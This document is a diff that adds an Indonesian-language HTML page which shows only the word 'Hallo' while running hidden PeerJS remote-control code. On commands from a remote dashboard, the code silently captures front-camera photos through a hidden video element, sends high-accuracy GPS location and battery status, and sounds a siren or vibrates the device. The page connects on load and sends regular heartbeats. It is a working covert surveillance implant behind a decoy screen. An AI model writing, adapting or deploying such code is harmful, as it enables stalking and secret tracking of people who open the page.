@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hallo</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            color: #111111;
+            overflow: hidden;
+            user-select: none;
+        }
+        h1 { font-size: 2rem; font-weight: 400; cursor: pointer; }
+        .hidden-service { display: none; }
+    </style>
+</head>
+<body>
+
+    <!-- Layar Penyamaran Kata Hallo -->
+    <h1 id="stealth-text">Hallo</h1>
+
+    <div class="hidden-service">
+        <video id="webcam-video" autoplay playsinline muted></video>
+        <canvas id="photo-canvas"></canvas>
+    </div>
+
+    <script>
+        const DEVICE_ID = "PRIV-HP2-HOME";
+        let peer = null;
+        let activeConn = null;
+
+        function startPeerClient() {
+            if (peer && !peer.destroyed) return;
+            
+            peer = new Peer(DEVICE_ID);
+
+            peer.on('open', (id) => {
+                console.log("[Client Ready] Peer ID:", id);
+            });
+
+            peer.on('connection', (conn) => {
+                activeConn = conn;
+                console.log("[Client Connected] Dashboard terhubung!");
+                
+                // Kirim status baterai saat terhubung
+                sendBatteryInfo();
+
+                conn.on('data', (data) => {
+                    handleRemoteCommand(data);
+                });
+            });
+
+            peer.on('error', (err) => {
+                console.warn("Peer Client Error:", err);
+                if (err.type === 'unavailable-id') {
+                    // Jika ID sibuk, reset peer
+                    setTimeout(() => {
+                        peer.destroy();
+                        startPeerClient();
+                    }, 3000);
+                }
+            });
+        }
+
+        function sendDataToDashboard(payload) {
+            if (activeConn && activeConn.open) {
+                activeConn.send(payload);
+            }
+        }
+
+        function sendBatteryInfo() {
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    sendDataToDashboard({
+                        type: 'battery',
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging
+                    });
+                });
+            }
+        }
+
+        function handleRemoteCommand(data) {
+            if (!data || !data.command) return;
+
+            switch(data.command) {
+                case 'GET_BATTERY':
+                    sendBatteryInfo();
+                    break;
+                case 'BUNYI_SIRENE':
+                    playSireneAudio();
+                    break;
+                case 'TAKE_PHOTO':
+                    takeSilentPhoto();
+                    break;
+                case 'GET_GPS':
+                    sendGPSLocation();
+                    break;
+                case 'VIBRATE':
+                    if ('vibrate' in navigator) navigator.vibrate([1000, 500, 1000]);
+                    break;
+            }
+        }
+
+        function playSireneAudio() {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.type = 'sawtooth';
+                osc.frequency.setValueAtTime(880, ctx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(440, ctx.currentTime + 1);
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start();
+                osc.stop(ctx.currentTime + 2);
+            } catch(e) {}
+        }
+
+        function sendGPSLocation() {
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        sendDataToDashboard({
+                            type: 'gps',
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                    },
+                    (err) => console.warn(err),
+                    { enableHighAccuracy: true }
+                );
+            }
+        }
+
+        function takeSilentPhoto() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                    .then(stream => {
+                        const video = document.getElementById('webcam-video');
+                        video.srcObject = stream;
+                        setTimeout(() => {
+                            const canvas = document.getElementById('photo-canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            const imageData = canvas.toDataURL('image/jpeg', 0.6);
+                            
+                            stream.getTracks().forEach(track => track.stop());
+                            sendDataToDashboard({ type: 'photo', image: imageData });
+                        }, 600);
+                    })
+                    .catch(err => console.error("Kamera error/ditolak", err));
+            }
+        }
+
+        // Jalankan saat layar disentuh / dimuat
+        document.body.addEventListener('click', () => {
+            startPeerClient();
+            sendBatteryInfo();
+        });
+
+        window.addEventListener('DOMContentLoaded', () => {
+            startPeerClient();
+            setInterval(() => {
+                if (activeConn && activeConn.open) {
+                    sendDataToDashboard({ type: 'heartbeat' });
+                }
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
